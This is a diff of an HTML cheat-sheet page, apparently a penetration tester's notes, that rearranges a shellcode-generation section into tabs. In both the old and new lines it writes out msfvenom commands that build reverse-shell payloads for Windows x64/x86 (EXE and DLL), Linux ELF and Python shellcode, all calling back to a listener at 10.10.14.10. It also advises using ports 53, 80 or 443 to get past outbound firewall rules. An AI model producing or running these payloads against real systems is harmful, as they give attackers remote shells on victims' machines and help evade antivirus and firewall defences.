@@ -197,25 +197,68 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="generate-metasploit-shellcode">Generate Metasploit Shellcode</h3>
-<h4 id="windows-x64-exe">Windows x64 EXE</h4>
+<h3 id="generate-shellcode">Generate Shellcode</h3>
+<p><small><em>Note: stageless payload can catch with nc directly</em></small></p>
+<h4 id="windows-x64">Windows x64</h4>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Staged exe</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Stageless exe</button>
+
+<button data-tabset="set1" data-tabcontent="tab3" >Staged dll</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> &gt; rev.exe
-</span></span></code></pre></div><h4 id="windows-x86-exe">Windows x86 EXE</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> &gt; rev.exe
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> &gt; rev.dll
+</span></span></code></pre></div></div>
+</div></p>
+<h4 id="windows-x86">Windows x86</h4>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Staged exe</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >Stageless exe</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Staged</span>
 </span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> &gt; rev.exe
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stageless</span>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stageless</span>
 </span></span><span class="line"><span class="cl">msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> <span class="nv">EXITFUNC</span><span class="o">=</span>thread &gt; rev.exe
-</span></span></code></pre></div><h4 id="windows-x64-dll">Windows x64 DLL</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> &gt; rev.dll
-</span></span></code></pre></div><p><small><em>Note: These will be flagged by AV</em></small>
+</span></span></code></pre></div></div>
+</div></p>
+<p><small><em>Note: These will be flagged by AV</em></small>
 <br>
 <small><em>Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</em></small></p>
-<h4 id="linux-amd64-elf">Linux amd64 ELF</h4>
+<h4 id="linux-amd64">Linux amd64</h4>
+<p>
+<button data-tabset="set3" data-tabcontent="tab1" class="active">Stageless elf</button>
+
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f elf &gt; rev.elf
-</span></span></code></pre></div><h4 id="others">Others</h4>
+</span></span></code></pre></div></div>
+</div></p>
+<h4 id="others">Others</h4>
+<p>
+<button data-tabset="set4" data-tabcontent="tab1" class="active">Staged python</button>
+
+<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate shellcode in python format and avoid specific bytes</span>
 </span></span><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f python -v shellcode --platform windows -b<span class="s1">&#39;\x00\x0a\0d&#39;</span> <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
